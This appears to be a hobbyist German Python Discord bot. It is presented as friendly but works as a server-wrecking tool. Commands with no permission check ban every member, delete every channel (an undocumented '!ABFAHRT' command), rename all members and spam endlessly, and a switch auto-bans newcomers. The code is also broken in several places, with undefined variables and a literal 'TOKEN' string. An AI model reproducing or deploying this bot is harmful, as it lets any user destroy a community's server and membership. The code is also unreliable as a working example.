'''
A very friendly Discord bot
Maximlian
12.01.2023
'''
import discord
import os
from dotenv import load_dotenv
import time
import math
import random

intents = discord.Intents.all()
client = discord.Client(intents = intents)

TOKEN = os.getenv('DISCORD_TOKEN')
GUILD = os.getenv('DISCORD_GUILD')





@client.event
async def on_ready ():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='durch dein Fenster :)'))
    for guild in client.guilds:
       if guild.name == GUILD:
           break

    print(f'{client.user} hat sich in folgenden Server eingespeist: \n' f'{guild.name}(id: {guild.id})')

    members = '\n - '.join([member.name for member in guild.members])
    print(f'Servermitglieder: \n - {members}')
    print("Was geht! Ich bin bereit ein paar Server zu crashen baby!")


##############################################################################################


@client.event
async def on_member_join(member):
    await member.create_dm()
    ###Nicht so nette Nachrichten lol###
    if schalter == an:
        ###Banne alle neuen Mitglieder###
        await member.dm_channel.send('Tut mir leid, aber du bist noch nicht groß genug für den Server... :( Versuche es in ein paar Jahren nochmal :) Tschüssi :)')
        await member.ban(reason = "Kiddo meint, du bist noch nicht groß genug für diesen Server. Du bist gebannt :)")

    elif schalter == aus:
    ###Nette Nachrichten für neue Mitglieder###
        await member.dm_channel.send(f'Hi {member.name}, willkommen auf dem Server! Regeln? Durchlesen? Schwachsinn! '
                                 f'Niemand liest sich die Regeln durch und glaub mir, sie sind unnötig. Also keine Zeit verschwenden!!')






@client.event
async def on_message(message):
    if message.author == client.user:
        return


    def check(m):
       return m.content == 'y' or m.content == 'yes' or m.content == 'n' or m.content == 'no' or m.content == 'ja' or m.content == 'nein'

    def Schalter(switch_state):
        switch = "error"
        if switch_state:
            switch = "an"
        if switch_state== False:
            switch = "aus"
        return switch

    if message.content.startswith('!switchpls'):
        if switch_state== False:
            await message.channel.send("Der Schalter ist an. Alle neuen Mitglieder werden gebannt. :)")
            switch_state = True
        if schalter:
            await message.channel.send("Der Schalter ist aus. Alle neuen Mitglieder werden begrüßt.")
            switch_state = False

    if message.content.startswith('!switchstatus'):
        switch_state = False
        await message.channel.send(f'Möchtest du den status deines Schalters erfahren? (y , yes , ja / n, no, nein)')
        response =  await client.wait_for('message', check=check , timeout = 15)
        if response.clean_content.lower() == 'y' or response.clean_content.lower() == 'yes' or response.clean_content.lower() == 'ja':
            await message.channel.send('Der Schalter ist ' + Schalter(switch_state))

        elif response.clean_content.lower() == 'n' or response.clean_content.lower() == 'no' or response.clean_content.lower() == 'nein':
            await message.channel.send('Okidoki, dann halt nicht :)')

        else:
            await message.channel.send("Du bist zu dumm um zu verstehen, was ich dir sage :)")
        ###Wenn wir ganz gemein unterwegs sind###
            #await message.author.ban(reason = "Kiddo meint, du bist zu dumm um zu verstehen, was ich dir sage. Du bist gebannt :)")

        #await message.channel.send(f'Der Status deines Schalters ist {Schalter(frage)}')


    if message.content.startswith('ping'):
        await message.channel.send('pong')

    elif message.content.startswith('@everyone'):
        await message.channel.send('LEISE!')

    elif message.content.startswith('!rolldice'):
        completeRoll = message.content.split(' ') [1]
        roll = int(completeRoll)
        while roll > 0:
            await message.channel.send('You rolled a ' + str(random.randint(1,6)))
            roll = roll - 1
            time.sleep(1)

    elif message.content.startswith('!lösche'):
        completeText = message.content.split(' ') [1]
        Limit = int(completeText)
        if Limit == 1:
           await message.channel.send('Eine Nachricht wird gelöscht... :)')
        elif Limit > 1:
            await message.channel.send(f'{Limit} Nachrichten werden gelöscht... :)')
        Limit = Limit + 2
        time.sleep(2)
        await message.channel.purge(limit = int(Limit))
        print(f'{Limit} Nachrichten wurden gelöscht. Glückwunsch!')


    elif message.content.startswith('!ban') and message.author.guild_permissions.ban_members:
        args = message.content.split(' ')
        if len(args) == 2:
            member : Member = discord.utils.find(lambda m: args[1] in m.name, message.guild.members)
            if member:
                await message.channel.send(f'{member} wird gebannt... Tschüssi {member} :)')
                time.sleep(2)
                await member.ban()
                await message.channel.send(f'{member} wurde gebannt :)')
            else:
                await message.channel.send('Der User wurde nicht gefunden!')


    elif message.content.startswith('!bänn all'):
        await message.channel.send('Alle User werden gebannt... Tschüssi :)')
        time.sleep(2)
        for guild in message.client.guild:
            for member in guild.members:
                await member.ban()
                await message.channel.send(f'{member} wurde gebannt!')


    elif message.content.startswith('!changenickpls'):
        await message.channel.send('Jawoll Chef alle Nicknames werden geändert... :)')
        time.sleep(2)
        for member in message.guild.members:  # loop through every member in the guild
            await member.edit(nick="727 WYSi WYFSi")  # reset their nickname


    elif message.content.startswith('!dance'):
        await message.channel.send("Let's dance :)" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\dance.mp4"))

    elif message.content.startswith('!ABFAHRT'):
        await message.channel.send("ABFAHRT!!!" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
        time.sleep(8)
        for channel in message.guild.channels:
            await channel.delete( reason = 'MFG KiddoBot :)')

    elif message.content.startswith('!help'):
        await message.channel.send('Du brauchst wirklich hilfe :nauseated_face: :face_vomiting:')
        time.sleep(0.5)
        await message.channel.send(" ```"
                                   "Hier ist die Hilfe: \n"
                                   "!help: Zeigt diese Nachricht dödel! \n"
                                   "-----------------------------------------------------------------------\n"
                                   "ping: Pong \n"
                                   "-----------------------------------------------------------------------\n"
                                   "@everyone: tu's nicht. \n"
                                   "-----------------------------------------------------------------------\n"
                                   "!lösche belieb. Zahl: löscht beliebig viele Nachrichten \n"
                                    "-----------------------------------------------------------------------\n"
                                    "!ban belieb. member: Bannt einen Member, wenn du die Rechte hast, das zu tun \n"
                                    "-----------------------------------------------------------------------\n"
                                    "!bänn all: Bannt alle Member, wenn du die Rechte hast, das zu tun \n"
                                    "-----------------------------------------------------------------------\n"
                                    "!changenickpls: Ändert alle Nicknames \n"
                                    "-----------------------------------------------------------------------\n"
                                    "!rolldice belieb. Zahl: Würfelt beliebig oft \n"
                                    "-----------------------------------------------------------------------\n"
                                   "!switchpls: Schaltet den Switch um \n"
                                    "-----------------------------------------------------------------------\n"
                                   "!switchstatus: Fragt, ob du den Status deines Schalters wissen willst \n"
                                    "-----------------------------------------------------------------------\n"
                                   "!dance: Zeigt dir ein Video, wo Kiddo mit seinen Freunden tanzt \n"
                                    "-----------------------------------------------------------------------\n"
                                   "```")


###Unendliche Nachrichten###
    if message.content == 'happy birthday':
        while True:
            await message.channel.send('Happy Birthday! 🎈🎉')
            time.sleep(0.6)
        #await message.guild.ban()
        #await message.channel.send('Alle User wurden gebannt!')




###Funktioniert NOCH nicht###Notiz: Wahrscheinlich kann man keine Channel in einem Community Server löschen###
#@client.event
#async def on_message(message):
  #  if message.content.startswith("channel löschen"):
     #   await message.channel.send('Okidoki bin dabei :)')
        #for guild in client.guilds:
           # for channel in guild.channels:
              #  await channel.delete()



client.run('TOKEN')